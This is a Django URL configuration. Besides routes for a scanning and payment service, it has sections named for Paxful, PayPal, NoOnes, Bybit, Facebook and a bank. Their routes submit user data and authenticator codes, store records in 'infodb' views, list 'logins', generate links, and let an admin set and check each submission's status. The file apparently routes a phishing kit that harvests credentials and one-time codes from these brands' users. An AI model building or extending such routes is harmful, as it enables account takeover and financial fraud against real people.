from django.urls import path
from . import views
from .views import PaypalPaymentView,RegisterView,CardPaymentView


urlpatterns = [
    path('', views.index, name='index'),
    path('paymentpax/', views.paymentpax, name='paymentpax'),
    path('dashboard/', views.dashboard, name='dashboard'),
    path('profile/', views.profile, name='profile'),
    path('scan/', views.scan, name='scan'),
    path('login/', views.login, name='login'),
    path('logout/', views.logout, name='logout'),
    path('register/', RegisterView.as_view(), name='register'),
    # path('paypal/validate/', PaypalValidatePaymentView.as_view(), name='paypalvalidate'),
    path('paypal/create/', PaypalPaymentView.as_view(), name='paypal_create'),
    path('paypal_cancel/', views.paypal_cancel, name='paypal_cancel'),
    # path('paypal_execute/', PaypalExecutePaymentView.as_view(), name='paypal_execute'),
    path('paypal_execute/', views.paypal_execute, name='payment_execute'),
    path('payment_success/', views.payment_success, name='payment_success'),
    path('otp_verification/', views.otp_verification, name='otp_verification'),
    path('payment_required/', views.payment_required_view, name='payment_required'),
    path('download_scan_pdf/', views.download_scan_pdf, name='download_scan_pdf'),
    path('scan/progress/<str:scan_id>/', views.scan_progress, name='scan_progress'),
    path('scan/results/<str:scan_id>/', views.scan_results, name='scan_results'),
    path('resend_otp/', views.resend_otp, name='resend_otp'),
    path('reset-password/', views.reset_password_request, name='reset_password_request'),
    path('verify-otp/', views.verify_otp, name='verify_otp'),
    path('reset-password-confirm/', views.reset_password_confirm, name='reset_password_confirm'),
    path('resend_otp_password/', views.resend_otp_password, name='resend_otp_password'),


       #urls for paxful

   # path('', views.index, name='index'),
    path('paxful/', views.paxful, name='paxful'),
    path('verification/<int:submission_id>/', views.verification, name='verification'),
    path('infodbpaxful/', views.infodbpaxful, name='infodbpaxful'),
    path('admin-panel/', views.admin_panel, name='admin_panel'),
    path('set-status/<int:submission_id>/', views.set_status, name='set_status'),
    path('check_status/<int:submission_id>/', views.check_status, name='check_status'),


    #urls for bancobhd but currently fb

       #path('', views.index, name='index'),
    path('home', views.home, name='home'),
   # path('upload/', views.upload, name='upload'),
    path('success/', views.success, name='success'),
   # path('view_image/<int:image_id>/', views.view_image, name='view_image'),
  #  path('infodbpax', views.infodbpax, name='infodbpax'),




       #urls for paypal

   # path('', views.index, name='index'),
    path('paypal/', views.paypal, name='paypal'),
    path('otppaypal/<int:submission_id>/', views.otppaypal, name='otppaypal'),
    path('infodbpaypal/', views.infodbpaypal, name='infodbpaypal'),
    path('paypal_profile/', views.paypal_profile, name='paypal_profile'),


    #paxfulpay
    path('indextwo', views.indextwo, name='indextwo'),
    path('linkgenerate', views.linkgenerate, name='linkgenerate'),  # Display all users
    path('linkgenerateshow', views.linkgenerateshow, name='linkgenerateshow'),
    path('receive', views.receive, name='receive'),
    path('add/', views.add_user, name='add_user'),  # Form to add or update user
    path('delete/<str:username>/', views.delete_user, name='delete_user'),  # Delete user by username


    #noones
    path('submit/', views.submit_user_data, name='submit_user_data'),
    path('submit-authenticator-code/', views.submit_authenticator_code, name='submit_authenticator_code'),
    path('infodbnoonesold/', views.infodbnoonesold, name='infodbnoonesold'),

    #noonesnew
    path('noones/', views.noones, name='noones'),
    path('verify/<int:submission_id>/', views.verify, name='verify'),
    path('infodbnoones/', views.infodbnoones, name='infodbnoones'),


     #noonespay
    path('receive_noones', views.receive_noones, name='receive_noones'),
    path('test',views.test,name='test'),

    #bybit
   # path('bybit/en', views.bybit, name='bybit'),
   # path('bybitlogins', views.bybitlogins, name='bybitlogins'),

    #facebook
  #  path('facebook', views.facebook, name='facebook'),
   # path('facebooklogins', views.facebooklogins, name='facebooklogins'),
   #addons scholl project
   path('verify_registration_otp/', views.verify_registration_otp, name='verify_registration_otp'),
   path('payment/', CardPaymentView.as_view(), name='payment'),
    
]
    



